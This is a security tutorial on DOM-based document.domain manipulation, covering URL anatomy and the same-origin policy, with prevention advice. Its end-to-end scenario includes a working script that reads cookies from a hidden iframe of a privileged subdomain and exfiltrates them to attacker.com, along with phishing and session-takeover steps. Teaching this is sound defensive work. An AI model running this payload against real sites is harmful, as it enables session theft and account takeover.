# DOM-Based Document-Domain Manipulation (Step-by-Step)

## 1.What is a URL?

A `URL` (Uniform Resource Locator) is the full web address used to access a specific resource on the internet.
Example:

```
https://login.example.com:443/dashboard?user=123#section2
```

Breakdown of the parts:
| Part | Value | Description |
|-----------------|---------------|---------------------------------------------------------|
| Protocol | https | Tells the browser how to communicate (HTTP or HTTPS) |
| Subdomain | login | A section of the domain used to organize content |
| Domain | example.com | The main website name |
| TLD (Top-Level Domain) | .com | The extension (like .com, .org, .net, etc.) |
| Port | 443 | Optional; HTTPS usually uses port 443 |
| Path | /dashboard | The specific page/resource |
| Query string | ?user=123 | Parameters passed to the server |
| Fragment/hash | #section2 | Used to scroll to a section of the page (not sent to the server) |

# 2.What is a Domain?

The domain is the name of the website.

Example:

- In `https://mail.google.com`, the domain is `google.com`.

A subdomain is a prefix before the domain:

- `mail.google.com`, `docs.google.com`, and `accounts.google.com` are subdomains of `google.com`.

## 3. What is a TLD (Top-Level Domain)?

The TLD is the last part of the domain name:

    Examples: `.com`, `.org`, `.net`, `.edu`, `.gov`

In `example.com`:

    `example` is the second-level domain

    `.com` is the top-level domain (TLD)

## 4. What is the Same-Origin Policy (SOP)?

The Same-Origin Policy is a security feature used by browsers.

It says that:

    A webpage can only access data from another page if both pages are from the same origin.

#### What is an "origin"?

An origin includes:

    Protocol (e.g., `http`, `https`)

    Hostname (e.g., `example.com`)

    Port (e.g., `443`, `80`)

Example:
| URL | Same Origin as `https://example.com`? | Why? |
|------------------------------|----------------------------------------|----------------------------------|
| `https://example.com/home` | ✅ Yes | Same protocol + domain + port |
| `http://example.com` | ❌ No | Different protocol |
| `https://login.example.com` | ❌ No | Different subdomain |
| `https://example.org` | ❌ No | Different TLD |

## 5. What is document.domain?

Normally, two pages can only talk to each other (via JavaScript) if they are from the exact same origin.

But, websites can loosen this rule on purpose by setting the `document.domain` property.
Example:

```
// On both pages
document.domain = "example.com";
```

Now:

    `shop.example.com` and `login.example.com` can access each other's DOM (JavaScript content), because they both lowered their origin to `example.com`.

This is called relaxing the same-origin policy.

##### When is this used?

- In older websites that use subdomains but want them to share cookies or interact via JavaScript.

## 6. What is Document-Domain Manipulation?

#### The Problem:

If a website sets `document.domain` using data the attacker controls, it opens the door for attacks.
Example:

```
// BAD: vulnerable code
document.domain = location.hash.slice(1); // attacker controls the hash
```

If a user visits:

```
https://example.com/#evil.com
```

Then the code becomes:

```
document.domain = "evil.com";
```

Now:

- The attacker’s page at `evil.com` and the victim’s page at `example.com` could be treated as the same origin (depending on browser behavior)

- This can lead to:

  - Data theft

  - DOM access

  - XSS-like behavior

  - Full account takeover

## 7. What Makes This Dangerous?

- Browsers allow relaxing from `sub.example.com` to `example.com`

- Some older or misconfigured browsers may allow setting the domain to something completely unrelated

- If an attacker can force the target page to set its domain to something insecure or attacker-controlled, they can break **SOP rules**

## 8. How to Prevent It

- Never set` document.domain` using untrusted input (e.g., from `location`, `document.URL`, or user input)

- Avoid setting `document.domain` at all unless absolutely needed

- Use `postMessage()` for secure cross-domain communication instead

- Modern applications usually don’t need this feature anymore

## Final Thoughts

DOM-based `document-domain` manipulation is a quiet but serious vulnerability. It’s often overlooked because `document.domain` is old and rarely used today. But if it’s used unsafely, it can completely break browser security.

## Example end-to-end Scenario: Exploit the unsafe use of document.domain to:

- Steal session cookies

- Gain access to sensitive data on a more privileged subdomain

### Scenario Setup

Assume the target has these two subdomains:

1. app.victim.com — Low-privileged web app (can be abused)

- Hosts user-uploaded content or an iframe that loads untrusted pages

- Sets:

```
    document.domain = "victim.com";
```

2. secure.victim.com — High-privileged web app (e.g., admin panel)

- Stores cookies like session_id, auth_token

- Also sets:

```
document.domain = "victim.com";
```

Now both apps think they're same-origin, even though they serve completely different roles.

### Step-by-Step Exploit

**Step 1: Identify Vulnerability**

- Visit both app.victim.com and secure.victim.com.

- dOpen DevTools console:

```
document.domain
```

If both return "victim.com", the boundary is relaxed.

Condition Met: Cross-subdomain access is possible.

**Step 2: Host Malicious Content on app.victim.com**

If app.victim.com allows:

- File uploads

- Custom HTML/JS embedding

- iframe injection

You create a malicious page like this:

```
<!-- https://app.victim.com/malicious.html -->
<html>
  <body>
    <script>
      // Set document.domain to match secure site
      document.domain = "victim.com";

      // Wait for iframe to load
      window.onload = function () {
        const iframe = document.getElementById("target");

        iframe.onload = function () {
          try {
            const secret = iframe.contentWindow.document.cookie;
            fetch("https://attacker.com/steal?cookie=" + encodeURIComponent(secret));
          } catch (e) {
            console.log("Exploit failed:", e);
          }
        };
      };
    </script>

    <!-- Load the privileged app -->
    <iframe id="target" src="https://secure.victim.com" style="display:none"></iframe>

  </body>
</html>
```

**Step 3: Deliver the Exploit**

- Send a phishing email or trick an admin into visiting:

```
https://app.victim.com/malicious.html
```

**Step 4: Cookie Theft**

When the admin loads the page:

- The malicious script gains access to iframe.contentWindow.document.cookie from secure.victim.com

- Exfiltrates it to attacker.com

- Attacker now has session token or auth cookie

---

**Step 5: Take Over the Admin Session**

- Attacker imports the cookie in their browser (via EditThisCookie or similar)

- Gains full access to secure.victim.com as the admin

### 🔓 Summary of Exploitable Conditions

| Condition                                            | Status |
| ---------------------------------------------------- | ------ |
| Both subdomains set `document.domain = "victim.com"` | ✅     |
| One subdomain is less secure or attack-controlled    | ✅     |
| Attacker can run JS on the weak subdomain            | ✅     |
| Cookies are scoped to `.victim.com`                  | ✅     |
| No `HttpOnly` flag on cookies                        | ✅     |

### How to Prevent This

1. Never relax document.domain — it’s deprecated and insecure.

2. Use postMessage for inter-subdomain communication.

3. Use HttpOnly cookies so JS can’t access them.

4. Use different origins for apps with different privilege levels.

5. Use Content Security Policy (CSP) to block untrusted scripts.

### Pentester's Checklist

[x] Do both subdomains set the same document.domain?

[x] Can attacker inject JS on any subdomain?

[x] Are cookies accessible via JavaScript?

[x] Are iframe protections (X-Frame-Options, CSP frame-ancestors) missing?

[x] Is the secure subdomain running a privileged session?
